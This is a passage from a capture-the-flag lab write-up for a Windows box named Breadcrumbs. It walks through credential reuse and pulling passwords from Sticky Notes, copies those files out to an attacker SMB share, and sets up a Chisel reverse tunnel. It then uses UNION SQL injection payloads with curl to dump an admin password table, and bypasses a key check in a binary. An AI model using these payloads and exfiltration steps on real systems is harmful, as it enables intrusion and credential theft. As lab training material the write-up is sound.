-a----        11/28/2020   1:48 AM            170 alex.disabled
-a----        11/28/2020   1:48 AM            170 emma.disabled
-a----        11/28/2020   1:48 AM            170 jack.disabled
-a----        11/28/2020   1:48 AM            170 john.disabled
-a----         1/17/2021   3:11 PM            192 juliette.json
-a----        11/28/2020   1:48 AM            170 lucas.disabled
-a----        11/28/2020   1:48 AM            170 olivia.disabled
-a----        11/28/2020   1:48 AM            170 paul.disabled
-a----        11/28/2020   1:48 AM            170 sirine.disabled
-a----        11/28/2020   1:48 AM            170 william.disabled 

```

The disabled file are JSON, but everything is null:

```

{
        "pizza" : "null",
        "size" : "null",
        "drink" : "null",
        "card" : "null",
        "PIN" : "null",
        "alternate" : {
                "username" : "null",
                "password" : "null",
        }
}

```

For juliette, there are values:

```

{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}

```

### SSH

Since this Windows host has SSH, I’ll give it a try, and it works:

```

oxdf@parrot$ sshpass -p 'jUli901./())!' ssh juliette@10.10.10.228
Warning: Permanently added '10.10.10.228' (ECDSA) to the list of known hosts.
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved. 

juliette@BREADCRUMBS C:\Users\juliette>

```

I’ll run `powershell` to get a better shell (including tab completion), and then grab `user.txt`:

```

PS C:\Users\juliette\Desktop> cat .\user.txt
0c330432************************

```

## Shell as administrator

### Enumeration

In the root of `C:\` there are two non-standard folders, `Anouncements` and `Development`. The first contains a single file with some announcements:

```

PS C:\> cat .\Anouncements\main.txt
Rabbit Stew Celebration
To celebrate the new library startup, a lunch will be held this upcoming Friday at 1 PM.
Location: Room 201 block B
Food: Rabbit Stew

Hole Construction
Please DO NOT park behind the contruction workers fixing the hole behind block A.
Multiple complaints have been made.

```

juliette doesn’t have access to `Development`.

On juliette’s desktop, there’s a `todo.html` (because julliette is the kind of person who makes lists in HTML tables complete with CSS):

```

<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>
</html>

```

I’m already in on port 22. Time to look at Sticky Notes and the password manager.

### Sticky Notes

Some Googling reveals that the [Sticky Notes data](https://www.techrepublic.com/article/how-to-backup-and-restore-sticky-notes-in-windows-10/) is stored at `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, and it’s there on Breadcrumbs:

```

PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> ls

    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal

```

The `-wal` file is the Write-Ahead Log (WAL) file. This is used to implement atomic commit and rollback. The `-shm` file is the Shared-Memory file for the DB, providing memory for multiple processes accessing the database. The three files together are critical for getting the data out. If I just take the `.sqlite` file, it will appear empty.

Interestingly, if I take all three to my machine, open the DB, make any kind of query, and then exit, because now no processes have handles to the DB, it will save it all into a single `.sqlite` file.

I’ll start a local SMB server on my box with `smbserver.py share . -smb2support`, and then copy the files to the new share:

```

PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> copy plum* \\10.10.14.13\share\

```

Now I have a local copy:

```

oxdf@parrot$ file plum.sqlite
plum.sqlite: SQLite 3.x database, last written using SQLite version 3022000

```

I’ll open the DB with `sqlite3 plum.sqlite`. It has a handful of tables:

```

sqlite> .tables
Media           Stroke          SyncState       User          
Note            StrokeMetadata  UpgradedNote  

```

Only the `Note` table has anything interesting in it. It has a bunch of columns:

```

sqlite> .schema Note
CREATE TABLE IF NOT EXISTS "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );

```

It’s the `Text` I care about, and it contains passwords:

```

sqlite> select Text from Note;
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]

```

I already had the password for juliette, though it’s good to see this one matches. development is new. And (of course) administrator isn’t there any more.

### Development SMB

juliette has access to the `Anouncements` share, but not the `Development` share:

```

oxdf@parrot$ smbmap -H 10.10.10.228 -u juliette -p 'jUli901./())!'
[+] IP: 10.10.10.228:445        Name: 10.10.10.228                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Anouncements                                            READ ONLY
        C$                                                      NO ACCESS       Default share
        Development                                             NO ACCESS
        IPC$                                                    READ ONLY       Remote 

```

development has read access to `Development`:

```

oxdf@parrot$ smbmap -H 10.10.10.228 -u development -p 'fN3)sN5Ee@g'
[+] IP: 10.10.10.228:445        Name: 10.10.10.228                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Anouncements                                            READ ONLY
        C$                                                      NO ACCESS       Default share
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC

```

The share has a single file, so I’ll grab a copy:

```

oxdf@parrot$ smbclient -U development //10.10.10.228/development 'fN3)sN5Ee@g'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan 15 19:03:49 2021
  ..                                  D        0  Fri Jan 15 19:03:49 2021
  Krypter_Linux                       A    18312  Sun Nov 29 06:11:56 2020

                5082961 blocks of size 4096. 1534428 blocks available
smb: \> get Krypter_Linux 
getting file \Krypter_Linux of size 18312 as Krypter_Linux (238.4 KiloBytes/sec) (average 238.4 KiloBytes/sec)

```

### Krypter\_Linux

#### Running

The binary is a x64 ELF that’s not stripped:

```

oxdf@parrot$ file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped

```

Running the binary gives some updates on it:

```

oxdf@parrot$ ./Krypter_Linux 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>

```

Trying with a key fails:

```

oxdf@parrot$ ./Krypter_Linux testkey
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

Incorrect master key

```

#### Ghidra

The `main` function is clearly identified in [Ghidra](https://ghidra-sre.org/), and matches the output above:

```

int main(int argc,long argv)

{
  long curl_struct;
  size_t key_len;
  basic_ostream *this;
  basic_string<char,std--char_traits<char>,std--allocator<char>> curl_resp [44];
  int curl_ret;
  int i;
  int res;
  
  basic_string();
  curl_struct = curl_easy_init();
  puts(
      "Krypter V1.2\n\nNew project by Juliette.\nNew features added weekly!\nWhat to expect nextupdate:\n\t- Windows version with GUI support\n\t- Get password from cloud and AUTOMATICALLYdecrypt!\n***\n"
      );
  if (argc == 2) {
    res = 0;
    i = 0;
    while( true ) {
      key_len = strlen(*(char **)(argv + 8));
      if (key_len <= (ulong)(long)i) break;
      res = res + *(char *)((long)i + *(long *)(argv + 8));
      i = i + 1;
    }
    if (res == 0x641) {
      if (curl_struct != 0) {
        puts("Requesting decryption key from cloud...\nAccount: Administrator");
        curl_easy_setopt(curl_struct,0x2712,"http://passmanager.htb:1234/index.php");
          curl_easy_setopt(curl_struct,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(curl_struct,0x4e2b,WriteCallback);
        curl_easy_setopt(curl_struct,0x2711,curl_resp);
        curl_ret = curl_easy_perform(curl_struct);
        curl_easy_cleanup(curl_struct);
        puts("Server response:\n\n");
        this = operator<<<char,std--char_traits<char>,std--allocator<char>>
                         ((basic_ostream *)cout,(basic_string *)curl_resp);
        operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                   endl<char,std--char_traits<char>>);
      }
    }
    else {
      puts("Incorrect master key");
    }
  }
  else {
    puts("No key supplied.\nUSAGE:\n\nKrypter <key>");
  }
  ~basic_string(curl_resp);
  return 0;
}

```

After printing the message, it checks to ensure the length of the args is two (which means one command line arg, as it counts the name of the binary), and if not, it prints the usage.

Then it does a loop over the key input, adding the bytes together, and if the sum isn’t 0x641, it returns “Incorrect master key” (this is bad crypto, hardcoding in this check for the key). I don’t end up needing this, as the program just creates a web request, so I’ll just drop to `curl`. But I’ll look at it in [Beyond Root](#beyond-root).

Then is builds a `curl` command:

```

        curl_easy_setopt(curl_struct,0x2712,"http://passmanager.htb:1234/index.php");
        curl_easy_setopt(curl_struct,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(curl_struct,0x4e2b,WriteCallback);
        curl_easy_setopt(curl_struct,0x2711,curl_resp);
        curl_ret = curl_easy_perform(curl_struct);

```

Even without knowing the constant values being set here, I can surmise it’s doing a `curl` to `http://passmanager.htb:1234/index.php`.

#### Request

TCP 1234 is listening on Breadcrumbs, just on localhost:

```

juliette@BREADCRUMBS C:\Users\juliette>netstat -ano | findstr 1234 
  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       2328

```

I’ll kill the SSH session and reconnect with `-L 1234:127.0.01:1234`, set `passmanager.htb` to 127.0.0.1 in `/etc/hosts`, and then used `curl`:

```

oxdf@parrot$ curl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

One important note that caused me lots of pain - Windows resolves `localhost` to `::1` (IPv6), which won’t always work well if IPv6 isn’t configured to accept the connection. In this case, the webserver isn’t listening on v6, so `-L 1234:127.0.0.1:1234` works where `-L 1234:localhost:1234` does not.

Before I completely figured that out, I turned to [Chisel](https://github.com/jpillora/chisel), uploading it, starting the server locally, and then connecting back to it:

```

juliette@BREADCRUMBS C:\ProgramData>c.exe client 10.10.14.13:8000 R:1234:127.0.0.1:1234 
2021/02/20 12:26:55 client: Connecting to ws://10.10.14.13:8000
2021/02/20 12:26:55 client: Connected (Latency 519.8µs)

```

At the server:

```

oxdf@parrot$ ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2021/02/20 15:23:37 server: Reverse tunnelling enabled
2021/02/20 15:23:37 server: Fingerprint 4QdkEkS0/jnGMqbWArJHdASsI+lv7x4pb18xwk9h55s=
2021/02/20 15:23:37 server: Listening on http://0.0.0.0:8000
2021/02/20 15:24:22 server: session#2: tun: proxy#R:1234=>1234: Listening

```

Now when I try `curl` it works, returning an AES key:

```

oxdf@parrot$ curl "http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

Finally, a third way to access the service is using `curl.exe` on Breadcrumbs without any forwarding:

```

juliette@BREADCRUMBS C:\ProgramData>curl "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"      
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("   
  }
}

```

### SQLI

#### Identify

The parameters in this request look very much like they are being fed into an SQL query. When an application is making the request instead of a browser, developers often are more careless with the input, so this is a good place to check for SQL injection. Looks promising:

```

oxdf@parrot$ curl "http://passmanager.htb:1234/index.php?method=select&username=administrator'&table=passwords"
select<br />
<b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php:18
Stack trace:
#0 C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php(18): mysqli_fetch_all(false, 1)
#1 {main}
  thrown in <b>C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php</b> on line <b>18</b><br />

```

I can guess that the query looks something like:

```

{method} key from {table} where username='{username}';

```

I’ll set `{username}` to `' or true;-- -` to make:

```

{method} key from {table} where username='' or true;-- -';

```

It works, though still only the one key:

```

oxdf@parrot$ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=' or true;-- -&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

#### UNION SQLI

I’ll set `{username}` to `' UNION SELECT 1;-- -` to make:

```

{method} key from {table} where username='' UNION SELECT 1;-- -';

```

It works:

```

oxdf@parrot$ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=' UNION SELECT 1;-- -&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(1) "1"
  }
}

```

Now I can use this to get data. List DBs to see there are only two:

```

oxdf@parrot$ curl -s "http://passmanager.htb:1234/index.php" -d "method=select&username=' UNION SELECT schema_name from information_schema.schemata;-- -&table=passwords"  | grep string | cut -d'"' -f2
information_schema
bread

```

The `bread` database only has one table, `passwords`:

```

oxdf@parrot$ curl -s "http://passmanager.htb:4444/index.php" -d "method=select&username=' UNION SELECT table_name from information_schema.tables where table_schema='bread';-- -&table=passwords"  | grep string | cut -d'"' -f2
passwords

```

That table has four columns:

```

oxdf@parrot$ curl -s "http://passmanager.htb:4444/index.php" -d "method=select&username=' UNION SELECT column_name from information_schema.columns where table_name='passwords';-- -&table=passwords"  | grep string | cut -d'"' -f2
id
account
password
aes_key

```

Get all the data:

```

oxdf@parrot$ curl -s "http://passmanager.htb:4444/index.php" -d "method=select&username=' UNION SELECT concat_ws(', ',id,account,password,aes_key) from passwords;-- -&table=passwords" | grep string | cut -d'"' -f2
1, Administrator, H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=, k19D193j.<19391(

```

### Decrypt

With an AES key and a password field that looks base64-encoded, I’ll turn to [Cyberchef](https://gchq.github.io/CyberChef/):

![image-20210203131515411](https://0xdfimages.gitlab.io/img/image-20210203131515411.png)

I had to guess an IV of all 0s, but the rest was pretty straight forward.

### Shell over SSH

[crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) confirms that password works for SSH as administrator:

```

oxdf@parrot$ crackmapexec ssh 10.10.10.228 -u administrator -p 'p@ssw0rd!@#$9890./'
SSH         10.10.10.228    22     10.10.10.228     [*] SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.10.10.228    22     10.10.10.228     [+] administrator:p@ssw0rd!@#$9890./ 

```

Now it’s just logging in and getting the flag:

```

oxdf@parrot$ sshpass -p 'p@ssw0rd!@#$9890./' ssh administrator@10.10.10.228
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved. 

administrator@BREADCRUMBS C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator> cd .\Desktop\
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name                                                                             
----                 -------------         ------ ----
d-----         1/15/2021   4:03 PM                passwordManager
-a----        11/29/2020   2:56 AM             32 root.txt

PS C:\Users\Administrator\Desktop> cat .\root.txt
b487a97c************************

```

## Beyond Root

The `Kryptor_Linux` program starts with this check (decompliation by Ghidra):

```

    res = 0;
    i = 0;
    while( true ) {
      key_len = strlen(*(char **)(argv + 8));
      if (key_len <= (ulong)(long)i) break;
      res = res + *(char *)((long)i + *(long *)(argv + 8));
      i = i + 1;
    }
    if (res == 0x641) {
...[snip do stuff because key is good...]
      }
    }
    else {
      puts("Incorrect master key");
    }

```

I mentioned above that this was really bad crypto. There’s a lot to critique here. Each loop, it re-calculate the `strlen` of the input before checking if `i` was past the end of the string. Then it gets this value:

```
*(char *)((long)i + *(long *)(argv + 8));

```

`*(long *)(argv + 8)` is the address in memory of the input string. So it’s going `i` bytes into that string, and then casting it as a `char`. This cast makes sure to only grab one byte (eight bits). That result is added to `res`.

In a Python terminal, that’s the same as:

```

>>> key = "not a good key"
>>> f'0x{sum([ord(y) for y in key]):x}'
'0x504'

```

So any key that totals to 0x641 will return the key. I can play with test strings to find lots that total 0x641:

```

>>> f'{sum([ord(y) for y in "aaaaaaaaaaaaaaa"]):x}'
'5af
>>> f'{sum([ord(y) for y in "aaaaaaaaaaaaaaaa"]):x}'
'610'
>>> f'{sum([ord(y) for y in "aaaaaaaaaaaaaaaa1"]):x}'
'641'

```

And that works:

```

oxdf@parrot$ ./Krypter_Linux aaaaaaaaaaaaaaaa1
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

Requesting decryption key from cloud...
Account: Administrator
Server response:

selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

These work as well:

```

>>> f'{sum([ord(y) for y in "aaaaaaaaaaaaaaab0"]):x}'
'641'
>>> f'{sum([ord(y) for y in "zzzzzzzzzzzyZ0"]):x}'
'641'
>>> f'{sum([ord(y) for y in "zzzzzzzzzzzyY1"]):x}'
'641'
>>> f'{sum([ord(y) for y in "zzzzzzzzzzzxX3"]):x}'
'641'

```

In summary, the binary was not needed once I found the `curl` request. Still, worth showing how easily this kind of gate is to bypass.